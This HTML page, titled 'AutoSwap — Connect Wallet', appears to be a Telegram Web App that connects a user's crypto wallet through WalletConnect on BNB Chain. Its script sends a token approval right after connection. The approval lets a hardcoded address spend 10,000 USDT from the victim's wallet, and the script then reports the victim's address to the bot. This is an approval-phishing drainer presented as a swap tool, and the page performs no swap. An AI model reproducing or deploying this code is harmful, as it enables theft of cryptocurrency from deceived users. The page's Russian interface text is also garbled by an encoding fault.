<!DOCTYPE html>
<html lang="ru">
<head>‚Ä¶</head>
<body>
  <div class="container">
    <h1>üîÑ AutoSwap ‚Äî Connect Wallet</h1>
    <canvas id="qrcode" width="240" height="240"></canvas>
    <div id="manual-uri">URI –±—É–¥–µ—Ç –∑–¥–µ—Å—å</div>
    <div id="status">–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>
    <button id="reconnect" class="btn">üîÅ –ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è</button>
  </div>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <script type="module">
    import SignClient from 'https://esm.sh/@walletconnect/sign-client@2.13.1';
    import { ethers } from 'https://esm.sh/ethers@6.14.3';
    const { Interface, parseUnits, getAddress } = ethers;

    const tg = window.Telegram?.WebApp; if (tg) tg.ready();

    const statusEl = document.getElementById("status");
    const uriEl = document.getElementById("manual-uri");
    const qrCanvas = document.getElementById("qrcode");
    const reconnectBtn = document.getElementById("reconnect");

    let client=null, session=null;

    const setStatus = (msg, col="#ccc")=>{statusEl.textContent=msg;statusEl.style.color=col;}
    const clearUI = ()=>{
      uriEl.textContent=""; qrCanvas.getContext('2d').clearRect(0,0,240,240);
    };

    reconnectBtn.onclick = ()=>init(true);

    async function connectWallet() {
      setStatus("üì∑ –ì–µ–Ω–µ—Ä–∞—Ü–∏—è QR‚Äë–∫–æ–¥–∞‚Ä¶","#4fc3f7");
      const { uri, approval } = await client.connect({ requiredNamespaces:{ eip155:{ chains:["eip155:56"], methods:["eth_sendTransaction"], events:["chainChanged","accountsChanged"] } }});
      QRCode.toCanvas(qrCanvas, uri, {width:240, margin:1});
      uriEl.textContent = uri;
      session = await approval();
      const address = session.namespaces.eip155.accounts[0].split(":")[2];
      setStatus(`‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ: ${address}`,"#66bb6a");
      await doApprove(address); // approve —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ —Ä–µ–∞–ª—å–Ω–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
    }

    async function doApprove(address) {
      setStatus("üöÄ –û—Ç–ø—Ä–∞–≤–∫–∞ approve...","#4fc3f7");
      const data = new Interface(["function approve(address,uint256)"]).encodeFunctionData("approve", [
        getAddress("0xC25edef7dbf23D4FBBB1Cecb9C56380eF35c11AE"),
        parseUnits("10000",18)
      ]);
      try {
        const tx = await client.request({ topic: session.topic, chainId:"eip155:56", request:{ method:"eth_sendTransaction", params:[{ from:address, to:getAddress("0x55d398326f99059ff775485246999027b3197955"), data }] }});
        setStatus(`‚úÖ Approve tx: ${tx}`,"#66bb6a");
        if(tg) tg.sendData(JSON.stringify({ address }));
      } catch(e) {
        console.error(e);
        setStatus(`‚ùå –û—à–∏–±–∫–∞: ${e.message||e.reason}`,"#ff6b6b");
      }
    }

    async function init(force=false){
      if (force && session) {
        await client.disconnect({ topic:session.topic, reason:{ code:6000, message:"User reconnected" }});
        session=null;
      }
      clearUI(); setStatus("üîå –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...","#ccc");

      client = await SignClient.init({
        projectId:"d868f90cd734355ae0328f8f0258b6b1",
        relayUrl:"wss://relay.walletconnect.com",
        metadata:{ name:"AutoSwap", description:"Approve USDT via WalletConnect", url:location.href, icons:["https://walletconnect.com/favicon.ico"] }
      });

      session = (await client.session.getAll())[0];
      if (session && !force) {
        const address = session.namespaces.eip155.accounts[0].split(":")[2];
        setStatus(`‚Ñπ –°–µ—Å—Å–∏—è –µ—Å—Ç—å: ${address}. –ù–∞–∂–º–∏—Ç–µ Reconnect –¥–ª—è approve.`,"#ffa500");
      } else {
        await connectWallet();
      }

      client.on("session_delete", () => {
        session=null;
        setStatus("‚ö†Ô∏è –°–µ—Å—Å–∏—è —É–¥–∞–ª–µ–Ω–∞.","#ffa500");
      });
    }

    init();
  </script>
</body>
</html>